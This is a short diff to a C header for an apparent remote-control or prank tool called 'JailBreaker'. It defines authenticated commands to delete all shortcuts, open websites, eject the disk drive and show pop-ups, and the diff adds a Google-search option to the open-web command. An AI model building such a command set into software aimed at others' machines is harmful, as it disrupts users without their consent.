@@ -28,7 +28,7 @@
     JB_LINKMAKE [i:linkCount-opt def:100]
     JB_LINKDEL  (void)
 
-    JB_OPENWEB  [s:site]
+    JB_OPENWEB  [s:site] [i:googleSearch-opt def:0] 
     JB_CDEJECT  (void)  -WIP
     JB_POPUPW   [s:msg] [s:wTitle-opt def:JB]
     JB_POPUPA   [s:msg] [s:wTitle-opt def:JB]
@@ -59,7 +59,7 @@ typedef enum {
     JB_LINKDEL,     // delete all shortcuts
 
     /* --- Other --- */
-    JB_OPENWEB,     // Open website in default browser
+    JB_OPENWEB,     // Open website or google search in default browser
     JB_CDEJECT,     // Eject disk drive
     JB_POPUPW,      // MessageBoxW
     JB_POPUPA,      // MessageBoxA
@@ -71,7 +71,7 @@ typedef enum {
 
 typedef struct {
     char auth[AUTH_LENGTH];
-    JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
+    JB_Instruction cmd;
     char args[CMD_ARGSZ];
 } JBCMD; // JailBreaker Command
 
